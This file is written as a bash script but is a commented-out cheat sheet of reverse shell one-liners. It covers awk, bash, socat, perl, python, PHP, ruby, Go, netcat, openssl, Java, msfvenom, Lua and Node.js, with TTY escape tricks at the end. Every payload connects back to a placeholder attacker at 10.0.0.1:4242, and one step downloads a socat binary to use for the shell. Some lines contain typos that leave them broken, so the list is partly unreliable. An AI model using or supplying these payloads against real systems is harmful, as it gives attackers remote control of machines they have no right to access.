#!/bin/bash

##############################################################
#                       Reverse Shells                       #
#            Validity of scripts are questionable:           #
#                       Use at own risk                      #
##############################################################

# awk #
#######
#awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do {printf "shell>" | & s; s |& getline c; of(c){while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# Bash-TCP #
############
#bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
#0<&192;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196

# Bash-UDP #
############
#user@victim$ sh -i >& /dev/udp/10.0.0.1/4242 0>&1
#user@attack$ nc -u -lvp 4242

# SOCAT #
#########
#user@attack$ socat file:'tty',raw,echo=0 TCP L:4242
#user@attack$ /tmp/socat exec:'bash - li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
#user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash - li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242

# PERL #
########
#perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN," >&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh - i");};'
#perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
# Windows Only #
#perl -MIO -e '$c=new IO::Socket::INET(PeerAddr, "10.0.0.1:4242");STDIN->fdopen($c,r);$~- >fdopen($c,w);system$_while<>;'

#Python - Linux #
#################
# IPV4 #
#export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys, socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),i nt(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
# IPV6 #
#python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2:125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/bash");'
#python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","i"]);'

# PHP #
#######
#php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
#php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh - i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

# Ruby #
########
#ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
#ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd, "r"){|io|c.print io.read}end'
# Windows Only #
#ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){io|c.print io.read}end'

# GOLANG #
##########
#echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

# NC Traditional #
##################
#nc -e /bin/sh 10.0.0.1 4242
#nc -e /bin/bash 10.0.0.1 4242
#nc -c bash 10.0.0.1 4242

# NC OPENBSD #
##############
#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f

# NCAT #
########
#ncat 10.0.0.1 4242 -e /bin/bash
#ncat --udp 10.0.0.1 4242 -e /bin/bash

# OPENSSL #
###########
#user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem - out cert.pem -days 365 -nodes
#user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem - port 4242
#user@attack$ ncat --ssl -vv -l -p 4242
#user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s

# JAVA #
########
#r = Runtime.getRuntime()
#p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line, do \$line 2>&5 >&5; done"] as String[]) p.waitFor()

# JAVA ALT1 #
#String host="127.0.0.1";
#int port=4444;
#String cmd="cmd.exe";
#Process p=new
#ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream
#pi=p.getInputStream(),pe=p.getErrorStream(),
#si=s.getInputStream(),OutputStream
#po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();Thread.sleep(50);try {p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();

# JAVA ALT2 #
#Thread thread = new Thread(){
#public void run(){
#    //reverse shell}}
#thread.start();

# WAR #
#######
#msfvenom -p /java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
#strings reverse.war | grep jsp #To get name of file

# Lua - Linux #
###############
#lua -e "require('socket');require('os');t=socket.tcp();t.connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua - Windows && Linux #
##########################
#lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd,"r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

# NODE.JS #
##########
#(function(){
#    var net = require("net"),
#        cp = require("child_process"),
#        sh = cp.spawn("/bin/sh", []);
#    var client = new.Socket();
#    client.connect(4242, "10.0.0.1", function() {
#        client.pipe(sh.stdin);
#        sh.stdout.pipe(client);
#        sh.stderr.pipe(client);
#    });
#    return /a/; //prevents Node.js app from crashing
#})();

#require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')

#-var x = global.process.mainModule.require
#-x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')

# INTERPRETER TTY SHELLS #
##########################
#:/bin/sh -i
#:python3 -c 'import pty;pty.spawn("/bin/sh")'
#:python3 -c "__import__('pty').spawn("/bin/bash")"
#:python3 -c "__import__('subprocess').call(["/bin/bash"])"
#:perl -e 'exec "/bin/sh";'
#:perl: exec "/bin/sh";
#:perl -e 'print '/bin/sh''
#:ruby: exec "/bin/sh"
#:lua: os.execute('/bin/sh')
#:vi: :!bash
#:vi: :set shell=/bin/bash:shell
#:nmap: !sh
#:mysql: ! bash

